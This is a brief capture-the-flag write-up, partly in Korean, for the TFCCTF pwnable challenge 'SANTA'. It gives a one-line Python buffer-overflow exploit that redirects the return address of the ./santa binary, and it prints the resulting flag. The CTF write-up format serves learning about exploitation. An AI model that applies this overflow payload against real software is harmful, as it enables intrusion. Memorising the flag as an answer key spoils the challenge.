# SANTA

#### Challenge author: tomadimitrie
#### Tell your wish to Santa... it might come true

<hr>

# Write up

<img width="1076" alt="Screen Shot 2021-11-28 at 11 18 37 AM" src="https://user-images.githubusercontent.com/84657474/143726306-7e1fd86d-88f9-4d3c-ab33-b53e0cc301a2.png">


진짜 정말 간단한 문제였다.
하지만 Pwnable 서버가 계속해서 다운이 되서 문제 풀이 과정을 운영진에게 보내고 exploit 후 sha256sum이 정상적으로 변경이 되면 Flag를 주는 방식으로 변경되었다.

<img width="1346" alt="Screen Shot 2021-11-28 at 11 17 36 AM" src="https://user-images.githubusercontent.com/84657474/143726289-9f0d9e51-dcda-4799-a045-2a65a4c932a8.png">

exploit code

```python -c 'print("A"*56+"\x56\x11\x40\x00\x00\x00\x00\x00")' | ./santa```


<img width="1792" alt="Screen Shot 2021-11-28 at 11 21 31 AM" src="https://user-images.githubusercontent.com/84657474/143726380-f32961b8-e5a0-40fc-bf5f-4ae7d6071853.png">

```TFCCTF{A11_I_w4nt_4_Chr15tm4s_i5_y0uuuu}```  
